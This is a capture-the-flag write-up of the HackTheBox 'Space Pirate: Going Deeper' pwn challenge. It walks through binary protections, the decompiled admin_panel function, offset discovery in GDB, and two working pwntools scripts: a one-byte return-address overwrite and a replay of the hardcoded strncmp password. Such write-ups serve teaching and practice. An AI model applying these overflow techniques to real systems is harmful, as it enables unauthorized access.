---
layout: post
title: 'HTB - Space Pirate: Going Deeper'
date: 2023-12-22 08:03 +0200
categories: [Exploit Development,HackTheBox - Challenges]
tags: [Pwn,1-byte BOF,NX,RELRO,Ghidra,GDB-Peda,Non-Stripped,Strcmp]  
image: "/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/Cover.png"
---

## **Challenge Description**

We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?

## **Challenge Info**

|                      |                                                                                                  |
|:--------------------:|:------------------------------------------------------------------------------------------------:|
| **Challenge Name**   |  Space Pirate: Going Deeper                                                                      |
| **Difficulty**       |  Very Easy                                                                                       |
| **Points**           |  10                                                                                              |
| **Source**           |  HackTheBox Challenge                                                                            |



## Challegne Files

Here is the zip file [Challenge.zip](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/Challenge.zip) which contains all the needed files to solve the challenge you can downloaded it.


## **Enumeration**

### **CheckSEC**

We start with a checksec to check the protections on the binary file

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/Checksec.png)

|     Protection       |      Status      |                                                Usage                         |
|:--------------------:|:----------------:|:----------------------------------------------------------------------------:|
|   **Canary**         |     Disabled     |   Prevents **Buffer OverFlow**
|   **Fortify**        |     Disabled     |   Detect **certain classes** of buffer overflows
|   **NX**             |     Enabled      |   Disable **Code Execution** on the Stack
|   **PIE**            |     Disabled     |   Randomizes the **Base Address** of the binary
|   **RELRO**          |     FULL         |   Make some of the binary sections **Read Only**


**Canary :** A stack Canary is a `secret value` placed on the stack which changes every time the program is started. Before a function returns, the stack canary is checked and if it appears to be tampered with, the program exits immeadiately. Stack cookies can be leaked with the help of e.g `format string` vulnerabilities. They are a defense mechanism against stack buffer overflows.

**Fortify :** Security feature that attempts to detect certain classes of buffer overflows. Its enabled by default on most Linux platforms

**NX :** Stands for non-executable segment, meaning that we cannot execute code on the stack.

**PIE :** Stands for Position Independent Executable, which randomizes the base address of the binary, as it tells the loader which virtual address it should use. To take full advantage of this feature, the executing kernel must support text Address Space Layout Randomization `(ASLR)`.

**RELRO :** Stands for Relocation Read-Only. The headers of the binary are marked as read-only.


### **File info**

Run the file command on the binary we found that it is a `64 bit executable` file and `non stripped` this means the binary has debugging information built into it (eg. Function Names).


```console                              
(kali㉿0xRyuzak1)-[~/HTB/HTB-Chall/Pwn/sp_going_deeper]─$ file sp_going_deeper
sp_going_deeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9f094957db0c2401b2ba895893f94941d618463e, not stripped
```

### **Ldd**

Using `ldd` to print shared object dependencies and we found that the binary will use the `libc` which already in the Challange zip file at **glibc directory**
 

```console
(kali㉿0xRyuzak1)-[~/HTB/HTB-Chall/Pwn/sp_going_deeper]─$ ldd sp_going_deeper
        linux-vdso.so.1 (0x00007ffebd6f4000)
        libc.so.6 => ./glibc/libc.so.6 (0x00007f1963c00000)
        ./glibc/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f19640ac000)
```

### **Run Binary**

Running the binary for the first time and select the first option `Disable Mechanism`

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/RunBinary1.png)

As we can see we got **Authentication failed!**

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/RunBinary1.png)

Run the binary again and this time check the sec option `login` but we got the same result **Authentication failed!**

### **Disassemble binary**

Using disassembler like [Ghidra](https://ghidra-sre.org/) to disassemble the binary . start with `main()` since the binary is not stripped.

```c
undefined8 main(void)
{
  setup();
  banner();
  puts("\x1b[1;34m");
  admin_panel(1,2,3);
  return 0;
}
```

So as we can see the main function do the following :
- Call Setup function
- Call Bunner function
- Print on screen 
- Call admin_panel function

So let's check those functions one by one 


#### **Setup & Banner functions**

As we can see the Setup function has nothing intersted in it, it just setup a stdin buffer and stdout buffer and call alarm function while give it paramter equel to `0x7f` this will triger alarm after `127` sec. 

```c
void setup(void)
{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x7f);
  return;
}
```

Also the banner function has nothing intersted it just used for the printing of the cool computer banner for the binary and change it's color.

```c
void banner(void)

{
  int iVar1;
  time_t tVar2;
  char *local_48 [4];
  undefined *local_28;
  undefined *local_20;
  undefined *local_18;
  char *local_10;
  
  local_48[0] = "\x1b[1;33m";
  local_48[1] = &DAT_00400c30;
  local_48[2] = &DAT_00400c38;
  local_48[3] = &DAT_00400c40;
  local_28 = &DAT_00400c48;
  local_20 = &DAT_00400c50;
  local_18 = &DAT_00400c58;
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  iVar1 = rand();
  puts(local_48[iVar1 % 6]);
  puts(&DAT_00400c60);
  local_10 = 
  "             ____________________________________________________\n            /                                                    \\\n           |    ___________________________________________ __     |\n           |   |                                             |    |\n           |   | go ldenfang@d12:$ history                    |    |\n           |   |     1 ls                                    |    |\n           |   |     2 mv secret_pass.txt flag.txt           |    |\n           |   |     3 chmod -x missile_launcher.py          |    |\n           |   |     4 ls                                    |    |\n           |   |     5 history                               |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |_____________________________________________|    |\n           |                                                      |\n            \\___________________ __________________________________/\n                   \\_______________________________________/ \n                _______________________________________________\n             _-\'    .-.-.-.-.- .-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_\n          _-\'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.   .-.-.`-_\n       _-\'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_\n    _-\'.-. -.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_\n _-\'.-.-.-.-.-. .---.-. .----- ------------------------. .-.---. .---.-.-.-.`-_\n:----------------------------------------------- ------------------------------:\n`---._.---------------------------------------------------------- -------._.---\'\n"
  ;
  puts(
      "             ____________________________________________________\n            /                                                    \\\n           |    ___________________________________ __________     |\n           |   |                                             |    |\n           |   | goldenfang@d12:$ history                    |    |\n           |   |     1 ls                                    |    |\n           |   |     2 mv secret_pass.txt flag.txt           |    |\n           |   |     3 chmod -x missile_launcher.py          |    |\n           |   |     4 ls                                    |    |\n           |   |     5 history                               |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |                                             |    |\n           |   |                                             |    |\n            |   |                                             |    |\n           |   |_________ ____________________________________|    |\n           |                                                      |\n            \\_____________________________________________________/\n                   \\_______________________________________/\n                ____________________ ___________________________\n             _-\'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- ` -_\n          _-\'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_\n       _-\'.-.-.-.  .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_\n    _-\'.-.-.-.-. .-----.-.-.-.-.-.-. -.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_\n _-\'.-.-.-.-.-. .---.-. .--------------------------- --. .-.---. .---.-.-.-.`-_\n:----------------------------------------------------------------- ------------:\n`---._.-----------------------------------------------------------------._.---\ '\n"
      );
  return;
}
```

This will leave us with the `Admin_panal` function

#### **Admin Panel Function**

As we see this is the content of the admin_panel function

```c
void admin_panel(long param_1,long param_2,long param_3)

{
  int iVar1;
  char local_38 [40];
  long local_10;
  
  local_10 = 0;
  printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \n[*] If you want to continue, disable the mechanism or login as admin.\n"
         ,param_1,param_2,param_3);
  while (((local_10 != 1 && (local_10 != 2)) && (local_10 != 3))) {
    printf(&DAT_004014e8);
    local_10 = read_num();
  }
  if (local_10 == 1) {
    printf("\n[*] Input: ");
  }
  else {
    if (local_10 != 2) {
      puts("\n[!] Exiting..\n");
                    /* WARNING: Subroutine does not return */
      exit(0x1b39);
    }
    printf("\n[*] Username: ");
  }
  read(0,local_38,0x39);
  if (((param_1 != 0xdeadbeef) || (param_2 != 0x1337c0de)) || (param_3 != 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,0x34);
    if (iVar1 != 0) {
      printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
      goto LAB_00400b38;
    }
  }
  printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
  system("cat flag*");
LAB_00400b38:
  puts("\n[!] For security reasons, you are logged out..\n");
  return;
}
```
Let's break that down to understand what this function exactly do :

- **Line 1 :** The function took 3 paramters called `param_1,param_2,param_3` and retrun nothing `void`
- **Line 4 - 8 :** Create the following :
    - Integer variable called `iVar1`
    - Char buffer called `local_38` with size equel to `40 char`
    - Long variable caleed `local_10` and set his intial value to `zero`
- **Line 9 :**  Print statement which has the values of the three paramters which has been passed to the funtion
- **Line 11 - 14 :** Check for the value of the `local_10` which will be act as the `option` which we want to choose if it's value not 1 or 2 or 3 print the option selection again.
- **Line 15 - 25 :** Depend on the option we select the following will happened :
    - **Option 1 :** Print this string `\n[*] Input: ` 
    - **Option 2 :** Print this string `\n[*] Username: `
    - **Option 3 :** Print this string `\n[!] Exiting..\n` and exit the application
- **Line 26 :** This is the important line after we choose the option if it is 1 or 2 the application will copy the first `0x39 = 57` char to the `local_38` buffer which we clarify before that it is and only `40 char buffer` so this is a `Buffer Overflow` part.
- **Line 27 - 38 :** Check if one of the 3 paramters `param_1,param_2,param_3` is not equel to `0xdeadbeef ,  0x1337c0de , 0x1337beef` respectively if it True will fo the following :
    -   Perform a String compare to the first `0x34 = 52` char in this variable `local_38` which is hold our input as we explain before with this string  `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft`
    - If the two string not like each other will print the `Authentication failed!` message and jump to LAB_00400b38 to print this message `For security reasons, you are logged out..`
    - If the two string are the same it will go to the part which will print this message `[+] Welcome admin! The secret message is:`  then cat the flag file from the system


## **Exploitation**

### **Method 1**

As we described before we have a BOF vuleranbility caused by this line of code `read(0,local_38,0x39)` so let's try to take advantage of the BOF in order to control the flow of the program to make it jump to call the instruction which will cat the flag for us `system("cat flag*")`

#### **Get Offset**

We need to get the offset for overwrite the `RIP` register in order to control to flow of the program so we do the following :
- Create uniq pattern (eg. 70 char long)
- Add breakpoint on `admin_panal+349` which is the `ret` instruction 
- Run program and select option 1 or 2 
- Enter our uniq pattern

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/OffsetCheck.png)

Now we are on the breakpoint at the `ret = pop RIP` instruction so now if we run this instruction the application will get the first element on the stack and set the RIP register to be equal to it but as we can see the first element on the stack is `0x400b41` which is nothing from our pattern so this may happend because the BOF give us small number of bytes to over flow so we cann't overflow the entire RIP but maybe only part from it

So to make sure that our theory is correct we check the `RBP` register and we found that part of our patern is ended to be in it `0x4147414131414162` this because of the `leave` instruction which equals in assembly code to `MOV rsp rbp` then `pop rbp` which leads to let our pattern ended up on `rbp`

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/OffsetCheck2.png)

So let's check the offset for the `RBP`

```console
(kali㉿0xRyuzak1)-[~/HTB/HTB-Chall/Pwn/sp_going_deeper]─$ gdb-peda -ex 'pattern_offset 0x4147414131414162'
4703800084066812258 found at offset: 48
```

So the offset is `48` and after this the `8` bytes will land on `RBP` so this will be `48 + 8 = 56` and we explain before we are copying `57 char` to the `40 char buffer` since so this will leave us with only 1 byte ( 57 - 56 = 1 byte ) which will overflow the RIP   

To prove this Let's send this payload ( 48*A + 8*B + C ) if we are correct this will happend : 
- The 48*A will be like junk
- THe 8*B will land on the RBP
- The C byte will land on the least significant byte on RIP

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/OffsetCheck3.png)

As we can see this what exactlly happen so we have `1-byte BOF` situation .

#### **Exploit**

Since the `PIE` protection is disabled so this means there is no any randmiztion on the program addresses every time its run so by controlling this byte we can control the flow of the program to make it jump to the instruction which print us the flag

```python
from pwn import *

# Binary filename
exe = './sp_going_deeper'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size =  64
log.info("Context Setting: " + context.arch + " " + context.os + " " + context.endian + " " + str(context.word_size))


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process(exe)

# Wait to get the '>> ' string then send 2 to select the sec option
io.sendlineafter(b'>> ',b"2")

# Create the payload of the exploit which conatins a 56 junk char (eg. A) then the least significant byte on RIP
payload = flat([
    b"A"*56,
    0x12
]) 

# Wait to get this string "[*] Username: " then send our malcious payload
log.info("Sending Payload")
io.sendlineafter(b'[*] Username: ',payload)

# Getting the Flag
log.success(f'Flag --> {io.recvline_contains(b"HTB").strip().decode()}')
```

The Exploit script do the following :
- **Line 1 - 13 :** Import Pwn Lib , Define the binary and the context and some usefull info about the binary 
- **Line 21 :** Run the binary
- **Line 24 :** Select the sec option (login option)
- **Line 27 - 30 :** Create the malcious payload which contains : 
  - 56 junk char ( eg. A ) 
  - The byte to overwrite the least byte in RIP and we choose it to be `0x12` will explain it later
- **Line 34 :** To send the payload 
- **Line 37 :** Filter the response from te binary to get the flag



##### **Choose The Byte Value** 

At the first try i just choose the value of the byte to be `0x19` because as we can see this is the least significant byte of the address of the instruction which run the system command 

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/SystemInstruction.png)

But when we did this thing not working correctly and i find as we can see that the argument which get passed to the system command is `0x1` which doesn't correct because i know from the analysis before that the argument is `cat flag*`

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/SystemInstruction2.png)

So after check i findout that the instruction before the system instruction is passing something to the `RDI` register which in `x64` application used to hold the first argument so this instruction has to be the one which responsible for getting the `cat flag*` so i change the byte to `0x12` to make the application not jump direct to the system instruction but jump to this one instead and as we can see working like a charm


![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/SystemInstruction3.png)

Now let's run the exploit script

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/Exploit.png)

As we can see we got the Flag


### **Method 2**

#### **strncmp**

As we decribed before in source code of the admin_panal function **Line 27 - 38** a check has been made to validate if one of the passed paramters `param_1,param_2,param_3` is not equel to `0xdeadbeef ,  0x1337c0de , 0x1337beef` respectively  a string compare check will trigger agnist our input to compare it to this string `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft` 


```c
  if (((param_1 != 0xdeadbeef) || (param_2 != 0x1337c0de)) || (param_3 != 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,0x34);
    if (iVar1 != 0) {
      printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
      goto LAB_00400b38;
    }
  }
  printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
  system("cat flag*");
LAB_00400b38:
  puts("\n[!] For security reasons, you are logged out..\n");
  return;
```

Recall the paramters which passed to the function are `1,2,3`

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/MainFunction.png)

So the code will always check our input string and compare it to this one `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft` so let's tring to pass the same string as our input

#### **Exploit**


Using the same previous exploit script we just change the payload to the following :
- The static string which we code from the code analysis before `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft`
- The `string terminator` which is a very important because without it the compare function will keep going until find the string terminator which will make the string not correct

```python
from pwn import *

# Binary filename
exe = './sp_going_deeper'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size =  64
log.info("Context Setting: " + context.arch + " " + context.os + " " + context.endian + " " + str(context.word_size))


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process(exe)

# Wait to get the '>> ' string then send 2 to select the sec option
io.sendlineafter(b'>> ',b"2")

# Create the payload of the exploit which conatins the static String to pass the string compare function plus the 0x00 which is the string terminator
payload = flat([
    b"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",
    0x00
]) 

# Wait to get this string "[*] Username: " then send our malcious payload
log.info("Sending Payload")
io.sendlineafter(b'[*] Username: ',payload)

# Getting the Flag
log.success(f'Flag --> {io.recvline_contains(b"HTB").strip().decode()}')
```

Now let's run the exploit script

![](/assets/img/hackthebox/challenges writeups/Space Pirate: Going Deeper/Exploit2.png)

And again we got the Flag.


